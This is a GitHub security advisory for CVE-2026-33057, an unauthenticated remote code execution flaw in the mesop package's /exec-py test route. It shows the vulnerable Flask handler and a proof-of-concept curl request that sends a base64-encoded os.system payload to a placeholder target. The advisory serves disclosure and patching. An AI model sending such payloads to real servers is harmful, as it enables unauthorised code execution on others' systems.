# [C] Mesop Affected by Unauthenticated Remote Code Execution via Test Suite Route /exec-py

## Summary
Severity: Critical
Advisory: GHSA-gjgx-rvqr-6w6v
CVE: CVE-2026-33057
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-gjgx-rvqr-6w6v
Type: github-advisory

## Affected
- PyPI: `mesop` — affected >=0 <1.2.3

## Details
#### Summary
An explicit web endpoint inside the `ai/` testing module infrastructure directly ingests untrusted Python code strings unconditionally without authentication measures, yielding standard Unrestricted Remote Code Execution. Any individual capable of routing HTTP logic to this server block will gain explicit host-machine command rights.

#### Details
The AI codebase package includes a lightweight debugging Flask server inside `ai/sandbox/wsgi_app.py`. The `/exec-py` route accepts base_64 encoded raw string payloads inside the `code` parameter natively evaluated by a basic `POST` web request. It saves it rapidly to the operating system logic path and injects it recursively using `execute_module(module_path...)`.

```python
# ai/sandbox/wsgi_app.py
@flask_app.route("/exec-py", methods=["POST"])
def exec_py_route():
  code = base64.urlsafe_b64decode(request.form.get("code"))
  # ... code is blindly written to file and forcefully executed
```

#### PoC
```bash
# Payload:
# import os
# os.system('echo "pwned by attacker" > /tmp/pwned.txt')
# 
# Base64 string represents the identical payload block above: 
# aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ==

curl -X POST http://<target_ip_address_hosting_sandbox>:port/exec-py \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ=="

# Validate exploitation target execution natively:
# $ cat /tmp/pwned.txt
# pwned by attacker
```

#### Impact
This presents trivial severity for systems publicly exposed or lacking strictly verified boundary firewalls due to absolute unauthenticated command injection privileges targeting the direct execution interpreter running this service sandbox.

## References
- https://github.com/mesop-dev/mesop/security/advisories/GHSA-gjgx-rvqr-6w6v
- https://nvd.nist.gov/vuln/detail/CVE-2026-33057
- https://github.com/mesop-dev/mesop/commit/825f55970c20686de3f28e2c66df4d74e9d4db47
- https://github.com/mesop-dev/mesop
